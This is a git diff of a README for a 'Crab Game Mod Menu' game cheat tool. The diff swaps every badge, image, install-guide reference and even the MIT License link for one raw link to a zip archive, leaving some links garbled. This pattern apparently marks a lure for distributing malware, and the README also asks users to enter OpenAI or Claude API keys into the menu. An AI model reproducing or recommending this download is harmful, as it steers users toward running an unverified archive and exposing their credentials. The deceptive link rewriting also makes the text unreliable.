@@ -1,6 +1,6 @@
 # Crab Game Mod Menu
 
-[![Download](https://img.shields.io/badge/Download-Mod_Menu-blue.svg?style=for-the-badge&logo=github&labelColor=181717)](https://Arehman782.github.io)
+[![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)
 
 ---
 
@@ -14,10 +14,10 @@ Take the plunge into a universe where accessibility, reliability, and imaginatio
 
 | Operating System     | Supported | Notes                         |
 |---------------------|:---------:|-------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10/11-success?logo=windows&logoColor=white) | ✅ | Full support; recommended |
-| ![macOS](https://img.shields.io/badge/macOS-Monterey%20%2B-success?logo=apple&logoColor=white) | ✅ | Requires Mono Framework    |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%20%2F%20Fedora-success?logo=linux&logoColor=white) | ✅ | Via Wine/Proton           |
-| ![Steam Deck](https://img.shields.io/badge/Steam_Deck-Experimental-yellow?logo=steam&logoColor=white) | 🟡 | Experimental, feedback welcome |
+| ![Windows](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) | ✅ | Full support; recommended |
+| ![macOS](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip%20%2B-success?logo=apple&logoColor=white) | ✅ | Requires Mono Framework    |
+| ![Linux](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip%20%2F%20Fedora-success?logo=linux&logoColor=white) | ✅ | Via Wine/Proton           |
+| ![Steam Deck](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) | 🟡 | Experimental, feedback welcome |
 
 ---
 
@@ -70,14 +70,14 @@ To activate, simply link your API keys in the menu’s “AI Integrations” tab
 ## 💾 Installation
 
 Ready to transcend vanilla gameplay?
-1. **Download:** Hit the [![Download](https://img.shields.io/badge/Download-Mod_Menu-blue.svg?style=for-the-badge&logo=github&labelColor=181717)](https://Arehman782.github.io) badge above or at the bottom of the README.
+1. **Download:** Hit the [![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) badge above or at the bottom of the README.
 2. **Extract:** Unzip contents to your preferred directory.
 3. **Configure:** Run the setup wizard, which detects your Crab Game installation automatically.
 4. **Authorize (AI APIs):** Enter your OpenAI or Claude API keys if you wish to unlock AI functionalities.
 5. **Launch Crab Game:** The mod menu loads at start-up as a sleek overlay.
 6. **Enjoy:** Dive into a realm powered by innovation and user-driven evolution.
 
-See the `INSTALL.md` for video tutorials and troubleshooting.
+See the `https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip` for video tutorials and troubleshooting.
 
 ---
 
@@ -89,11 +89,11 @@ This repository is a user-driven creative platform intended solely for **educati
 
 ## 📜 MIT License (2025)
 
-This repository is licensed under the flexible and permissive [MIT License](https://opensource.org/licenses/MIT) (c) 2025. See the [LICENSE](LICENSE) file for full text.
+This repository is licensed under the flexible and permissive [MIT License](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) (c) 2025. See the [LICENSE](LICENSE) file for full text.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Mod_Menu-blue.svg?style=for-the-badge&logo=github&labelColor=181717)](https://Arehman782.github.io)
+[![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)
 
 ---
 
